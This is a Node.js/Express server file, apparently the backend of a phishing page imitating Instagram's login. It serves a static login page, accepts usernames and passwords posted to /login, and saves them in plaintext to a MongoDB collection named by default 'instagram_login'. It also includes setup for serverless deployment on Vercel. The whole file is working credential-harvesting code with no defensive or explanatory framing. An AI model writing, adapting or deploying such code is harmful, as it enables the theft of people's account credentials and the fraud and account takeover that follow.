const express = require('express');
const path = require('path');
const { MongoClient } = require('mongodb');
const dns = require('dns');
require('dotenv').config();

// Set custom DNS servers to fix SRV resolution issues
dns.setServers(['8.8.8.8', '8.8.4.4']);

const app = express();
const PORT = process.env.PORT || 3000;
const mongoUri = process.env.MONGODB_URI;
const dbName = process.env.DB_NAME || 'instagram_login';
const collectionName = process.env.COLLECTION_NAME || 'logins';
console.log('Loaded environment variables:');
console.log('MONGODB_URI:', mongoUri ? 'Set' : 'Not set');
console.log('DB_NAME:', dbName);
console.log('COLLECTION_NAME:', collectionName);
console.log('PORT:', PORT);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// Global variables to cache MongoDB client for serverless environments
let cachedClient = null;
let cachedDb = null;

async function connectToMongo() {
  if (!mongoUri) {
    console.error('MONGODB_URI is not set.');
    return { client: null, db: null };
  }

  // Use cached client if available
  if (cachedClient && cachedDb) {
    console.log('Using cached MongoDB connection');
    return { client: cachedClient, db: cachedDb };
  }

  try {
    const client = new MongoClient(mongoUri, {
      serverSelectionTimeoutMS: 10000,
      connectTimeoutMS: 10000,
      tls: true
    });
    await client.connect();
    const db = client.db(dbName);

    // Cache the client and db
    cachedClient = client;
    cachedDb = db;

    console.log(`Connected to MongoDB Atlas database: ${dbName}`);
    return { client, db };
  } catch (error) {
    console.error('MongoDB connection failed:', error.message);
    console.error('Full error:', error);
    return { client: null, db: null, error: error.message };
  }
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', async (req, res) => {
  const username = (req.body.username || '').trim();
  const password = (req.body.password || '').trim();

  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password are required.' });
  }

  const { db, error } = await connectToMongo();

  if (!db) {
    return res.status(500).json({
      success: false,
      message: error || 'MongoDB Atlas connection failed.'
    });
  }

  try {
    const result = await db.collection(collectionName).insertOne({
      username,
      password,
      createdAt: new Date()
    });

    return res.json({
      success: true,
      message: 'Login data saved successfully.',
      insertedId: result.insertedId
    });
  } catch (error) {
    console.error('Failed to save login data:', error);
    return res.status(500).json({ success: false, message: error.message || 'Failed to save login data.' });
  }
});

// Listen only if running locally (not in Vercel serverless)
if (process.env.VERCEL !== '1') {
  app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
  });
}

// Export the app for Vercel serverless functions
module.exports = app;
